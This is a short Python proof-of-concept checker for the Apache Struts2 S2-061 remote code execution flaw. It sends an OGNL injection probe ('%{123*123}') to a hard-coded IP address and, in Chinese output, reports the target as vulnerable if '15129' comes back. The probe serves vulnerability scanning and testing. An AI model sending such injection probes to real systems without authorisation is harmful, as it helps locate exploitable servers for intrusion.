"""
strtus2-s2-061  POC
"""
import requests

url = 'http://120.25.24.45:32464/'
payload = "?id=%25{123*123}"

res = requests.get(url+payload)
# print(res.text)

if "15129" in res.text:
    print('%s 存在strtus2-s2-061远程代码执行漏洞' %url)
else:
    print('%s 不存在strtus2-s2-061远程代码执行漏洞' % url)

